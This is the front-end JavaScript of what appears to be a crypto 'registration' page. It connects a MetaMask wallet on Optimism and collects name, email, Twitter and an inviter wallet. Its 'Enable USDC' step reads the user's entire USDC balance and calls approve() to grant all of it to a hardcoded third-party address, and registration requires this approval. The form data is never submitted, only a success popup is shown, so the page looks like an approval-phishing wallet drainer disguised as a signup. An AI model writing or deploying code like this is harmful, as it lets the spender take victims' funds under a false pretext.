const ethereumButton = document.getElementById("shortAddress");

ethereumButton.addEventListener('click', () => {
  const { ethereum } = window;
  if (ethereum && ethereum.isMetaMask) {
    ethereum.request({ method: 'eth_requestAccounts' });
  } else {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: "You don't have MetaMask! Install it right now!",
    })
  }
});

window.addEventListener('load', (event) => {
  ethereum.request({ method: 'eth_accounts' })
  .then((accounts) => {
    const useraddress = accounts[0]
    if (useraddress == undefined) {
      ethereumButton.disabled = false;
      ethereumButton.innerHTML = 'Connect Wallet'
    } else {
      ethereumButton.disabled = true
      const shortenAddress = useraddress.slice(0, 5) + '...' + useraddress.slice(useraddress.length - 4);
      ethereumButton.innerHTML = shortenAddress;
      }

      const checkAllowance = contract.methods.allowance(useraddress, '0x98958d815DD2317a50200393A075A149e98C11b6').call()
      .then(USDCAllowed => {
      if (USDCAllowed>0) {
        enable.disabled = true
        enable.innerHTML = 'Successfully enabled'
        enableSucceed = true
      }else{
        enable.disabled = false
        enable.innerHTML = 'Enable USDC'
      }});
  })
  });

ethereum.on('accountsChanged', function (accounts) {
  if (ethereum.selectedAddress == null) {
    ethereumButton.disabled = false;
    ethereumButton.innerHTML = 'Connect Wallet'
    enable.disabled = false
    enable.innerHTML = 'Enable USDC'
  } else {
      ethereumButton.disabled = true
      const shortAddress = ethereum.selectedAddress;
      const shortenAddress = shortAddress.slice(0, 5) + '...' + shortAddress.slice(shortAddress.length - 4);
      ethereumButton.innerHTML = shortenAddress;
      const checkAllowance = contract.methods.allowance(shortAddress, '0x98958d815DD2317a50200393A075A149e98C11b6').call()
    .then(USDCAllowed => {
    if (USDCAllowed>0) {
      enable.disabled = true
      enable.innerHTML = 'Successfully enabled'
      enableSucceed = true
    }else{
      enable.disabled = false
      enable.innerHTML = 'Enable USDC'
    }});
    }
});

const web3 = new Web3(window.ethereum);

var abi = [
  {
  "inputs":[{
      "internalType":"address",
      "name":"owner",
      "type":"address"
  },{
      "internalType":"address",
      "name":"spender",
      "type":"address"
  }],
  "name":"allowance",
  "outputs":[{
      "internalType":"uint256",
      "name":"",
      "type":"uint256"
  }],
  "stateMutability":"view",
  "type":"function"
},{
  "inputs":[{
      "internalType":"address",
      "name":"spender",
      "type":"address"
  },{
      "internalType":"uint256",
      "name":"amount",
      "type":"uint256"
  }],
  "name":"approve",
  "outputs":[{
      "internalType":"bool",
      "name":"",
      "type":"bool"
  }],
  "stateMutability":"nonpayable",
  "type":"function"
},{
  "inputs":[{
      "internalType":"address",
      "name":"account",
      "type":"address"
  }],
  "name":"balanceOf",
  "outputs":[{
      "internalType":"uint256",
      "name":"",
      "type":"uint256"
  }],
  "stateMutability":"view",
  "type":"function"
}];

var address = '0x7F5c764cBc14f9669B88837ca1490cCa17c31607';
var contract = new web3.eth.Contract(abi, address);

var enable = document.getElementById('Enable');
var enableSucceed = false;

enable.addEventListener('click', () => {

  if (ethereum.selectedAddress == null) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Connect your wallet first!',
    });
  } else {
  chainId = ethereum.request({ method: 'eth_chainId' }).then(chainSymbol => { 
  if (chainSymbol == 0xA) {
  console.log('All is good')
  const shortAddress = ethereum.selectedAddress;
  const res = contract.methods.balanceOf(shortAddress).call()
  .then(USDCBalance => {
  console.log(USDCBalance)
  const shortAddress = ethereum.selectedAddress;
  contract.methods.approve('0x98958d815DD2317a50200393A075A149e98C11b6', (USDCBalance)).send({from: shortAddress})
  .then(function(tx)
    {
      Swal.fire(
        'Good job!',
        'You have successfully enabled USDC!',
        'success'
      );
      enableSucceed = true;
      enable.innerHTML = 'Successfully enabled'
    }).catch(function(tx)
      {
        Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: 'Please try again!',
      });
      })
  })
  .catch(error => Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: 'Please try again!',
      }) )
    }else { 
      Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: 'Select Optimism Network in your wallet!',
      })
    }
  });
};     
});

var submit = document.getElementById('Submition')
var formName = document.getElementById('exampleInputName')
var formEmail = document.getElementById('exampleInputEmail1')
var formTwitter = document.getElementById('exampleInputTwitter')
var formInviter = document.getElementById('exampleInputInviterWallet')

submit.addEventListener('click', () => {
  if ((ethereum.selectedAddress != null) && (formName.value.length>0) && (formEmail.value.length>0) && (formTwitter.value.length>0) && (formInviter.value.length>0) && (enableSucceed == true)) {
    Swal.fire(
      'Good job!',
      'You have successfully registered!',
      'success'
    );
  }else{
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Complete all tasks to register!',
    })
  }
}); 